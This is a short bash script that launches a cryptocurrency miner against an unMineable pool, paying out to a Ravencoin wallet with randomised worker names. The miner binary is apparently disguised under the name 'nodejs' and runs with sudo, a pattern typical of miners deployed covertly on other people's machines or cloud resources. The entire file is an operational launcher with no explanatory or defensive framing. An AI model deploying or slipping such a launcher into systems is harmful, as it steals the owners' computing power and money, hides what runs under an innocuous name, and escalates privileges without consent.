#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=RVN:RY28x597iBdNnLziuhQ3Y1z9C48Zjo2ysn
WORKER=$(echo $(shuf -i 1-30 -n 1)-gass) 
chmod +x nodejs
sudo ./nodejs -pool $POOL -wal $WALLET.$WORKER -pass x
